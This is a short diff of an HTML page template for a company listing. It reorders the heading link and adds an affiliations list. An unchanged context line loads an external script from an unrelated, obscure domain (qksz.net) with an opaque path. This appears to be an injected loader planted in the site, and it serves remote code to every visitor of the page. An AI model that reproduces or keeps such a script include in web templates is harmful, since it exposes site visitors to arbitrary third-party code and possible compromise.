@@ -6,7 +6,7 @@
 
     <div class="yui-ge">
         <div class="yui-u first">
-            <a href="../;view"><h1>${company}</h1></a>
+            <h1><a href="../;view">${company}</a></h1>
             <img stl:if="logo" border="0" src="../logo" style="float: right" />
             <address>
               ${address}<br/>
@@ -18,6 +18,10 @@
           P: ${phone}&nbsp;-&nbsp;F: ${fax} 
           <a href=";enquiry_form" class="action"><span>Make an enquiry</span></a>
         ${tabs}
+            <ul class="info">
+                <li stl:repeat="item affiliations">${item/title} -
+                                                    ${item/affiliation_no}</li>
+            </ul>
         <div align="center">
         <SCRIPT type="text/javascript" LANGUAGE="javascript" src="http://www.qksz.net/1e-g2df"> </SCRIPT>
         </div>
